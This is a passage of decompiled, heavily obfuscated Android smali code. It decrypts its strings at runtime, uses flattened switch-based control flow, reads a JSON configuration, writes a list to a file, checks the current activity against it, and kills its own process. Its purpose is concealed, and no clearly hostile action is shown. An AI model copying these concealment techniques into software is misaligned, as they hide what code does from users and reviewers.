    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    :sswitch_71
    add-int/lit8 v0, v3, 0x1

    move v3, v0

    goto/16 :goto_c

    :sswitch_72
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "gWxHg0Vdo/g4EVv/GH8bQFYOHoAtFaoYPjNW/xxq\n"

    const-string v2, "2ov7EKDwO6U=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "nV35PkyrUnHQCcpJH4I4\n"

    const-string v2, "cuF12fcjtNw=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "TVyOaBw=\n"

    const-string v2, "KC78B261oNU=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Landroid/os/Process;->myPid()I

    move-result v0

    invoke-static {v0}, Landroid/os/Process;->killProcess(I)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_1

    goto :goto_22

    :catch_1
    move-exception v0

    const-string v1, "OXxQXLLQZ1WGJlMow9UYtPF+QVe++HLv3zUJRfeVQrWHP10n49gQtPg=\n"

    const-string v2, "Ypvsz1d9/wg=\n"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-static {v1, v2, v3, v0}, Landroidx/base/남자;->d(Ljava/lang/String;Ljava/lang/String;Ljava/lang/StringBuilder;Ljava/lang/Exception;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "0aPJdno=\n"

    const-string v2, "tNG7GQhoL34=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_22

    :sswitch_73
    :try_start_8
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "i7qlV9xHgFcyx7krgWU471zY/FS0D4m3NOW0K4Vw\n"

    const-string v2, "0F0ZxDnqGAo=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, "ebKR1Xky9xc065eSKgesXzW9\n"

    const-string v2, "lg4dMsK6Ebo=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "CMAt4C8=\n"

    const-string v2, "bbJfj13en9I=\n"

    invoke-static {v1, v2}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_22

    :sswitch_74
    const-string v0, "OM5MObrNgxeGnkJP7+b89vDMXTK65oKv5owWNvOGt+uLlmBC/uzyz+7OTQS72LY=\n"

    const-string v1, "Yynwql9gG0o=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "MiM=\n"

    const-string v3, "XUiehpMu3vk=\n"

    invoke-static {v1, v3}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    sput-object v5, Landroidx/base/저장;->b:Lorg/json/JSONObject;

    const-string v0, "oiq2P94=\n"

    const-string v1, "xk/USrlJR4k=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v5, v0, v1}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v0

    sput-boolean v0, Landroidx/base/저장;->c:Z

    const-string v0, "BQSAXMJ2+AwOHohLwFLo\n"

    const-string v1, "Z2jhP6k3m3g=\n"

    invoke-static {v0, v1}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v3

    const v1, 0x74af1ef5

    const-string v0, "\u06e8\u06db\u06ec\u06ec\u06db\u06e5\u06e4\u06e4\u06db\u06eb\u06df\u06e1\u06d8\u06d8\u06eb\u06d6\u06d6\u06e1\u06e0\u06dc\u06dc\u06eb\u06ec\u06e4\u06e1\u06d8\u06e1\u06d8\u06dc\u06e1\u06e6\u06d8\u06eb\u06d7\u06df\u06dc\u06e0\u06e5\u06d8"

    :goto_23
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_1

    move-result v4

    xor-int/2addr v4, v1

    sparse-switch v4, :sswitch_data_20

    goto :goto_23

    :sswitch_75
    const-string v0, "\u06e7\u06e4\u06d8\u06e7\u06e0\u06e6\u06d8\u06e5\u06d8\u06e0\u06eb\u06e1\u06e5\u06df\u06d9\u06e6\u06e0\u06e8\u06dc\u06df\u06dc\u06d8\u06e7\u06e0\u06e5\u06d8\u06eb\u06e2\u06eb\u06e8\u06e6\u06d7\u06da\u06e6\u06df\u06e2\u06d7\u06e7\u06e2\u06e6\u06e8\u06da\u06e8\u06d7"

    goto :goto_23

    :sswitch_76
    :try_start_9
    const-string v0, "\u06e0\u06df\u06db\u06dc\u06df\u06d9\u06db\u06db\u06e1\u06d8\u06e7\u06e2\u06df\u06e8\u06e7\u06e0\u06e7\u06e8\u06e1\u06d6\u06e5\u06e1\u06d7\u06e7\u06dc\u06d8\u06e2\u06df\u06d8\u06e2\u06dc\u06e6\u06d8\u06e2\u06e1\u06d9\u06e6\u06e4\u06e5"

    goto :goto_23

    :sswitch_77
    const v4, -0x58d9e0c

    const-string v0, "\u06e8\u06e0\u06e5\u06d8\u06e0\u06da\u06ec\u06e2\u06eb\u06df\u06e6\u06e2\u06e6\u06d9\u06e0\u06dc\u06d9\u06e2\u06d7\u06dc\u06d8\u06e4\u06d6\u06e1\u06d8\u06e5\u06d6\u06da\u06da\u06e8\u06dc\u06df\u06d7\u06e1\u06d8\u06e2\u06e4\u06df\u06e7\u06d8\u06e4\u06df\u06e0\u06d7"

    :goto_24
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v4

    sparse-switch v6, :sswitch_data_21

    goto :goto_24

    :sswitch_78
    const-string v0, "\u06da\u06d7\u06d9\u06eb\u06e6\u06ec\u06d7\u06e2\u06d8\u06e1\u06e0\u06d8\u06e8\u06e2\u06db\u06d7\u06e1\u06da\u06e7\u06e6\u06d8\u06e8\u06dc\u06e5\u06d7\u06e2\u06e5\u06d8\u06e1\u06e1\u06d8\u06d8\u06dc\u06e6\u06e1\u06d8\u06eb\u06e2\u06d7\u06db\u06d8\u06dc\u06d8\u06e7\u06e4\u06eb\u06e2\u06d6\u06e6\u06d8\u06dc\u06e0\u06dc"

    goto :goto_23

    :cond_10
    const-string v0, "\u06da\u06e1\u06dc\u06d8\u06d6\u06d8\u06e0\u06db\u06e0\u06eb\u06db\u06d6\u06e7\u06d9\u06d9\u06e1\u06e8\u06eb\u06e8\u06e8\u06e6\u06da\u06e1\u06e7\u06d9\u06da\u06e1\u06dc\u06d8\u06e2\u06e8"

    goto :goto_24

    :sswitch_79
    if-eqz v3, :cond_10

    const-string v0, "\u06df\u06e6\u06e2\u06eb\u06e6\u06e5\u06e5\u06e6\u06df\u06e1\u06e1\u06dc\u06d8\u06e0\u06e2\u06e2\u06e8\u06da\u06d7\u06e1\u06e6\u06e1\u06d8\u06d9\u06df\u06e7\u06d7\u06ec\u06e6\u06eb\u06e2\u06e0\u06db\u06e8\u06e1\u06d8\u06eb\u06e6\u06e5\u06d6\u06da\u06e8\u06db\u06e8\u06e7\u06e2\u06d8\u06eb\u06df\u06e4\u06e7\u06e8\u06e1\u06e7\u06e2\u06d6\u06e5"

    goto :goto_24

    :sswitch_7a
    const-string v0, "\u06dc\u06e5\u06ec\u06e4\u06d6\u06eb\u06e1\u06e2\u06d8\u06d8\u06e2\u06e1\u06e6\u06d8\u06e5\u06e7\u06e4\u06ec\u06df\u06e7\u06eb\u06da\u06dc\u06e6\u06d7\u06e1\u06e6\u06e1\u06e6\u06e5\u06d7\u06d8\u06da\u06e1\u06d6\u06d8\u06e8\u06d6\u06db\u06e2\u06e1\u06db\u06d9\u06d8\u06db\u06e7\u06e8\u06d6\u06db\u06ec\u06e1\u06d8"

    goto :goto_24

    :sswitch_7b
    new-instance v0, Ljava/io/File;

    invoke-virtual {p0}, Landroid/content/Context;->getFilesDir()Ljava/io/File;

    move-result-object v1

    const-string v4, "N2PGvFKuxH0hZtG2TZjAbQpsxrxRlIt0JmDJ\n"

    const-string v6, "VQ+n3znxpR4=\n"

    invoke-static {v4, v6}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v0, v1, v4}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V
    :try_end_9
    .catch Ljava/lang/Exception; {:try_start_9 .. :try_end_9} :catch_1

    :try_start_a
    new-instance v1, Ljava/io/FileWriter;

    const/4 v4, 0x0

    invoke-direct {v1, v0, v4}, Ljava/io/FileWriter;-><init>(Ljava/io/File;Z)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_2

    const/4 v0, 0x2

    :try_start_b
    invoke-virtual {v3, v0}, Lorg/json/JSONArray;->toString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/io/Writer;->write(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/io/Writer;->flush()V
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_0

    :try_start_c
    invoke-virtual {v1}, Ljava/io/Writer;->close()V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_2

    :goto_25
    :try_start_d
    invoke-static {}, LKvrUY/RiiGL/Utils;->getCurrentActivity()Landroid/app/Activity;

    move-result-object v4

    const v1, -0x1a4261ac

    const-string v0, "\u06e5\u06e8\u06d6\u06d8\u06dc\u06dc\u06d8\u06d8\u06e0\u06dc\u06e2\u06e2\u06d7\u06e1\u06e7\u06e6\u06e1\u06df\u06df\u06da\u06e8\u06e4\u06e7\u06e0\u06e8\u06e1\u06d8\u06d8\u06d8\u06e2\u06d6\u06e5\u06eb\u06df\u06eb\u06e2\u06df\u06e6\u06d6\u06df\u06e7\u06e0\u06d8\u06e2\u06e4\u06df\u06e2\u06e4\u06d9\u06e8\u06d8\u06e0\u06e0\u06d7\u06e7\u06d8\u06e1\u06d8"

    :goto_26
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v1

    sparse-switch v6, :sswitch_data_22

    goto :goto_26

    :sswitch_7c
    const v6, -0xf209ac6

    const-string v0, "\u06dc\u06ec\u06e7\u06e1\u06d6\u06df\u06e5\u06d9\u06df\u06db\u06e7\u06db\u06d9\u06eb\u06dc\u06e0\u06e1\u06d8\u06d8\u06df\u06da\u06eb\u06dc\u06d9\u06db\u06e2\u06e2\u06e8\u06df\u06dc\u06d8\u06e0\u06ec\u06d9\u06da\u06e8\u06e7"

    :goto_27
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v6

    sparse-switch v7, :sswitch_data_23

    goto :goto_27

    :sswitch_7d
    const-string v0, "\u06ec\u06e5\u06e5\u06d8\u06d8\u06e5\u06da\u06e4\u06eb\u06eb\u06dc\u06d6\u06e5\u06e0\u06e0\u06e2\u06e4\u06d9\u06e6\u06da\u06ec\u06e4\u06e8\u06e0\u06dc\u06d8\u06dc\u06e2\u06e5\u06d8\u06dc\u06e7\u06e6\u06e6\u06e7\u06e1\u06db\u06e6\u06d8\u06e4\u06e1\u06ec\u06d6\u06d6\u06d8\u06d8\u06db\u06e5\u06d8\u06ec\u06e6\u06d6"
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_1

    goto :goto_26

    :catchall_0
    move-exception v0

    :try_start_e
    invoke-virtual {v1}, Ljava/io/Writer;->close()V
    :try_end_e
    .catchall {:try_start_e .. :try_end_e} :catchall_1

    :goto_28
    :try_start_f
    throw v0
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_2

    :catch_2
    move-exception v0

    :try_start_10
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "DiMw/+Q3EX28fx2JkRdsrcAhCvXkHyzF8XVk2KR1Nbo=\n"

    const-string v6, "VcSMbAGaiSA=\n"

    invoke-static {v4, v6}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    const-string v1, "yUvL0Yw=\n"

    const-string v4, "rDm5vv6lc78=\n"

    invoke-static {v1, v4}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroidx/base/프로세서;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V
    :try_end_10
    .catch Ljava/lang/Exception; {:try_start_10 .. :try_end_10} :catch_1

    goto :goto_25

    :catchall_1
    move-exception v1

    :try_start_11
    invoke-virtual {v0, v1}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V
    :try_end_11
    .catch Ljava/lang/Exception; {:try_start_11 .. :try_end_11} :catch_2

    goto :goto_28

    :cond_11
    :try_start_12
    const-string v0, "\u06e1\u06e0\u06d6\u06d8\u06eb\u06e6\u06d7\u06df\u06df\u06d6\u06dc\u06d8\u06dc\u06e2\u06d8\u06d8\u06df\u06e4\u06e0\u06d7\u06dc\u06e0\u06e2\u06e1\u06d8\u06e4\u06e2\u06e6\u06d8\u06e4\u06e1\u06d6\u06df\u06d6\u06da\u06e0\u06d8\u06d8\u06d7\u06e8\u06d9\u06e8\u06db\u06dc\u06e2\u06e1\u06d6\u06dc\u06e8\u06d8"

    goto :goto_27

    :sswitch_7e
    if-eqz v4, :cond_11

    const-string v0, "\u06dc\u06d6\u06e0\u06e6\u06dc\u06d8\u06e5\u06d6\u06e5\u06d8\u06d8\u06da\u06dc\u06e5\u06e0\u06e0\u06e8\u06e4\u06e2\u06d9\u06da\u06da\u06d7\u06da\u06d9\u06e5\u06df\u06dc\u06e8\u06e0\u06e6\u06e2\u06d7\u06e1\u06ec\u06eb\u06e1"

    goto :goto_27

    :sswitch_7f
    const-string v0, "\u06d9\u06da\u06e5\u06d8\u06e4\u06e1\u06e4\u06d9\u06d9\u06d8\u06d8\u06e8\u06da\u06d7\u06e8\u06db\u06e4\u06d7\u06e6\u06e5\u06d8\u06d6\u06d6\u06e0\u06e0\u06e2\u06eb\u06e8\u06e1\u06d6\u06d8\u06e8\u06d8\u06d8\u06d7\u06eb\u06d8\u06d8\u06dc\u06eb\u06e1\u06df\u06e8\u06ec\u06e8\u06e4\u06e5"

    goto :goto_27

    :sswitch_80
    const-string v0, "\u06e2\u06d8\u06e1\u06eb\u06ec\u06eb\u06d6\u06e0\u06d6\u06d8\u06e0\u06e4\u06e4\u06dc\u06ec\u06d8\u06e5\u06e2\u06eb\u06dc\u06e8\u06e8\u06d8\u06e8\u06dc\u06d8\u06da\u06df\u06e1\u06ec\u06e4\u06ec\u06e1\u06db\u06e5\u06e0\u06e7\u06e6\u06e2\u06dc\u06e5\u06d8\u06d6\u06db\u06db"
    :try_end_12
    .catch Ljava/lang/Exception; {:try_start_12 .. :try_end_12} :catch_1

    goto :goto_26

    :sswitch_81
    const-string v0, "\u06e6\u06e8\u06eb\u06e2\u06e7\u06dc\u06e4\u06e7\u06d6\u06d8\u06d9\u06ec\u06e8\u06d8\u06eb\u06e1\u06d8\u06da\u06e8\u06db\u06ec\u06ec\u06eb\u06d7\u06db\u06e5\u06d9\u06da\u06db\u06d7\u06d6\u06d6\u06e6\u06dc\u06d8\u06db\u06eb\u06df\u06e7\u06eb\u06db\u06e4\u06e1\u06e6\u06d8"

    goto :goto_26

    :sswitch_82
    :try_start_13
    invoke-virtual {v4}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v6

    move v1, v2

    :goto_29
    const v2, 0x6d702be9

    const-string v0, "\u06db\u06df\u06ec\u06e8\u06d6\u06e0\u06eb\u06da\u06e4\u06e0\u06eb\u06e7\u06d9\u06e0\u06d8\u06e0\u06e6\u06d8\u06dc\u06da\u06d8\u06d8\u06e2\u06da\u06d7\u06e2\u06df\u06e1\u06df\u06e4\u06d8\u06e2\u06df\u06e5\u06d7\u06e2\u06e5\u06e5\u06db\u06d7\u06d8\u06da\u06e2\u06db\u06e0\u06d7\u06d7\u06e6\u06d9\u06d6\u06d8\u06d8\u06d8\u06ec\u06d8\u06e8\u06d8"

    :goto_2a
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v2

    sparse-switch v7, :sswitch_data_24

    goto :goto_2a

    :sswitch_83
    const-string v0, "\u06d8\u06d8\u06eb\u06d7\u06ec\u06e5\u06e1\u06ec\u06e5\u06e8\u06e2\u06e2\u06df\u06eb\u06e6\u06d8\u06e0\u06e6\u06e6\u06d8\u06ec\u06e4\u06d6\u06d8\u06d9\u06e5\u06dc\u06e7\u06d7\u06d6\u06e6\u06e1\u06e8\u06e8\u06e4\u06da\u06e8\u06e8\u06da"

    goto :goto_2a

    :sswitch_84
    const-string v0, "\u06e4\u06e5\u06e0\u06e2\u06e0\u06db\u06e2\u06d6\u06d6\u06d7\u06eb\u06d8\u06e0\u06db\u06dc\u06e6\u06d7\u06e1\u06e8\u06e7\u06d8\u06d9\u06eb\u06e0\u06d8\u06ec\u06dc\u06e1\u06e7\u06eb\u06df\u06e2\u06e7\u06db\u06e0\u06eb\u06e7\u06e6\u06da\u06e0\u06e5\u06e0\u06d7\u06dc\u06e7\u06d8\u06dc\u06df\u06ec\u06e1\u06e6\u06ec\u06e0\u06e6\u06e4"

    goto :goto_2a

    :sswitch_85
    const v7, 0x1928a6d7

    const-string v0, "\u06d9\u06e6\u06da\u06e7\u06e7\u06e4\u06e0\u06dc\u06dc\u06dc\u06ec\u06dc\u06e0\u06dc\u06da\u06d9\u06e2\u06ec\u06e7\u06dc\u06eb\u06dc\u06df\u06d9\u06ec\u06d7\u06e5\u06e0\u06db\u06da\u06e5\u06e5\u06e8\u06db\u06e0\u06d9\u06e7\u06ec\u06e1\u06d7\u06e7"

    :goto_2b
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_25

    goto :goto_2b

    :sswitch_86
    invoke-virtual {v3}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-ge v1, v0, :cond_12

    const-string v0, "\u06ec\u06eb\u06df\u06e0\u06df\u06d7\u06e0\u06eb\u06e0\u06d6\u06e8\u06dc\u06d8\u06da\u06db\u06e8\u06d8\u06e7\u06e0\u06da\u06e0\u06e4\u06e5\u06d8\u06da\u06d9\u06eb\u06d8\u06e4\u06e8\u06d8\u06dc\u06eb\u06dc\u06eb\u06e0\u06ec\u06e7\u06e4\u06e6\u06d8\u06e2\u06ec\u06d7\u06e8\u06d6"

    goto :goto_2b

    :cond_12
    const-string v0, "\u06eb\u06e5\u06ec\u06db\u06d8\u06d7\u06e5\u06ec\u06d8\u06d8\u06e2\u06ec\u06da\u06e8\u06e5\u06d8\u06d8\u06d7\u06ec\u06d8\u06d8\u06da\u06e2\u06d6\u06eb\u06eb\u06db\u06e4\u06e8\u06d8\u06d8\u06e1\u06e8\u06d9\u06da\u06e5\u06d8\u06eb\u06e2\u06ec"

    goto :goto_2b

    :sswitch_87
    const-string v0, "\u06d9\u06eb\u06e1\u06d8\u06e1\u06e1\u06e1\u06d8\u06dc\u06e4\u06db\u06da\u06e1\u06e6\u06e0\u06d9\u06e4\u06e5\u06e5\u06e4\u06e5\u06da\u06e5\u06e4\u06eb\u06e7\u06da\u06e1\u06d8\u06e2\u06d9\u06d8\u06d8\u06d9\u06e7\u06d6\u06d8\u06dc\u06da\u06d6\u06d8\u06db\u06df\u06e7\u06d6\u06e1\u06db\u06e5\u06ec\u06e1\u06d8\u06e8\u06e5\u06dc\u06d8"

    goto :goto_2b

    :sswitch_88
    const-string v0, "\u06ec\u06e5\u06e8\u06d8\u06d9\u06d8\u06e7\u06d8\u06e7\u06eb\u06df\u06d9\u06dc\u06e1\u06e5\u06d8\u06eb\u06e0\u06df\u06e7\u06e8\u06dc\u06ec\u06d9\u06dc\u06e5\u06d9\u06e1\u06e8\u06df\u06d7\u06e0\u06e1\u06e4\u06e2\u06e0\u06e8\u06d8\u06d8\u06e1\u06e0\u06e6\u06e0\u06dc\u06e7\u06d8\u06e0\u06d7\u06d6\u06d8\u06d8\u06dc\u06da\u06e6\u06d8\u06df\u06e7\u06e2\u06e5"

    goto :goto_2a

    :sswitch_89
    const v2, -0x46dedb9e

    const-string v0, "\u06e7\u06dc\u06d6\u06d8\u06e5\u06e2\u06e7\u06eb\u06e7\u06e8\u06e0\u06d8\u06dc\u06d8\u06eb\u06db\u06df\u06d6\u06e0\u06e7\u06d9\u06e2\u06d9\u06e8\u06d9\u06d9\u06e7\u06e8\u06d8\u06d8\u06eb\u06e2\u06e6\u06da\u06d6\u06d6\u06d8\u06db\u06dc\u06e8\u06db\u06d7\u06ec\u06dc\u06dc\u06d6\u06d8\u06df\u06eb\u06d9\u06e2\u06e1\u06e0"

    :goto_2c
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v2

    sparse-switch v7, :sswitch_data_26

    goto :goto_2c

    :sswitch_8a
    const v7, 0x6096f75b

    const-string v0, "\u06da\u06ec\u06e7\u06e6\u06e6\u06e6\u06d8\u06eb\u06e1\u06d8\u06e6\u06e7\u06d9\u06d6\u06d6\u06e8\u06e5\u06d6\u06d8\u06eb\u06e4\u06e6\u06df\u06e8\u06eb\u06ec\u06d8\u06d8\u06da\u06e2\u06eb\u06da\u06d7\u06dc\u06d8\u06d8\u06dc\u06d9\u06da\u06ec\u06e1\u06d8\u06eb\u06d7\u06e4\u06e7\u06e1\u06da\u06ec\u06e6\u06e6"

    :goto_2d
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_27

    goto :goto_2d

    :sswitch_8b
    const-string v0, "\u06db\u06eb\u06e5\u06d8\u06e8\u06d8\u06da\u06eb\u06db\u06e2\u06e4\u06e0\u06eb\u06d6\u06dc\u06e7\u06d8\u06e2\u06d7\u06e5\u06d8\u06dc\u06e5\u06e1\u06d8\u06d8\u06dc\u06d8\u06d8\u06d7\u06e5\u06e6\u06d8\u06d8\u06d8\u06ec"

    goto :goto_2c

    :sswitch_8c
    const-string v0, "\u06dc\u06da\u06eb\u06df\u06eb\u06df\u06e4\u06d6\u06e7\u06e2\u06e6\u06d8\u06e8\u06da\u06e6\u06e0\u06e5\u06e1\u06d8\u06e7\u06e1\u06dc\u06d8\u06df\u06d7\u06e4\u06db\u06da\u06da\u06df\u06ec\u06d8\u06d8\u06e4\u06df\u06e2\u06e7\u06e7\u06e6\u06d8"

    goto :goto_2c

    :cond_13
    const-string v0, "\u06d6\u06e6\u06e7\u06d8\u06e8\u06da\u06dc\u06d6\u06e1\u06e6\u06d8\u06e6\u06d7\u06d7\u06da\u06da\u06e5\u06d8\u06dc\u06e7\u06e6\u06d7\u06d9\u06e7\u06da\u06df\u06e5\u06d8\u06e1\u06e7\u06e8\u06d8\u06d7\u06d8\u06d6\u06d8\u06d6\u06da\u06e8\u06e0\u06ec\u06e8\u06d8\u06e5\u06dc\u06ec\u06e1\u06e7\u06e5\u06db\u06e0\u06e4\u06e5\u06e1\u06db\u06ec\u06e5\u06eb\u06d9"

    goto :goto_2d

    :sswitch_8d
    invoke-virtual {v3, v1}, Lorg/json/JSONArray;->optString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_13

    const-string v0, "\u06e1\u06eb\u06da\u06e1\u06e7\u06e6\u06d8\u06e0\u06d6\u06e6\u06db\u06d7\u06e4\u06e6\u06e1\u06e8\u06da\u06e8\u06d9\u06da\u06df\u06e1\u06e7\u06e0\u06e1\u06e4\u06e8\u06e8\u06dc\u06e4\u06e0\u06d8\u06e8\u06e7\u06d7\u06dc\u06e0\u06d6\u06db\u06e2\u06e1\u06d7\u06d8\u06e6\u06dc\u06d8\u06dc\u06df\u06da"

    goto :goto_2d

    :sswitch_8e
    const-string v0, "\u06e5\u06e5\u06d9\u06e0\u06da\u06e8\u06d8\u06ec\u06d9\u06d7\u06d6\u06ec\u06dc\u06e6\u06d9\u06e8\u06e1\u06d9\u06d6\u06d8\u06eb\u06db\u06e6\u06df\u06dc\u06db\u06dc\u06d6\u06d9\u06d8\u06db\u06e2\u06e5\u06e1\u06d7\u06e0\u06e7\u06e1\u06d8\u06db\u06e8\u06d8\u06d8\u06e2\u06e8\u06e5\u06d8\u06d9\u06e1\u06e8\u06eb\u06da\u06dc\u06d8\u06e8\u06d7\u06e5\u06d8\u06d8\u06db"

    goto :goto_2d

    :sswitch_8f
    const-string v0, "\u06e5\u06e7\u06d6\u06d8\u06d8\u06e4\u06d6\u06db\u06eb\u06eb\u06d9\u06e2\u06e0\u06e2\u06e6\u06eb\u06e6\u06e8\u06e4\u06e6\u06e6\u06dc\u06db\u06e5\u06dc\u06d8\u06e4\u06e1\u06e8\u06e8\u06d8\u06e1\u06dc\u06e8\u06df\u06ec\u06e7\u06ec\u06dc\u06da\u06e6\u06e8\u06e2\u06d6\u06d8\u06d9\u06db\u06d6\u06db\u06eb\u06ec\u06d6\u06e1\u06e7\u06e4\u06e6\u06d8"

    goto :goto_2c

    :sswitch_90
    new-instance v0, Landroidx/base/연결;

    const/4 v1, 0x2

    invoke-direct {v0, p0, v4, v1}, Landroidx/base/연결;-><init>(Landroid/content/Context;Landroid/app/Activity;I)V

    invoke-virtual {v4, v0}, Landroid/app/Activity;->runOnUiThread(Ljava/lang/Runnable;)V

    :sswitch_91
    invoke-static {}, LKvrUY/RiiGL/Utils;->getCurrentActivity()Landroid/app/Activity;

    move-result-object v1

    const v2, -0x2f31b8da

    const-string v0, "\u06df\u06e8\u06d8\u06d8\u06e8\u06e6\u06df\u06d7\u06eb\u06dc\u06d8\u06ec\u06d8\u06e5\u06dc\u06ec\u06dc\u06e4\u06e4\u06d6\u06db\u06e6\u06e1\u06d6\u06ec\u06d8\u06e4\u06e5\u06ec\u06e8\u06ec\u06e2\u06db\u06ec\u06da\u06e7\u06ec\u06df\u06d7\u06d8\u06d6\u06d8\u06e1\u06db\u06d9\u06e8\u06ec\u06e0\u06e0\u06ec\u06e8\u06d8\u06e0\u06dc\u06d6\u06df\u06dc\u06dc"

    :goto_2e
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_28

    goto :goto_2e

    :sswitch_92
    const v3, 0x1910a9ca

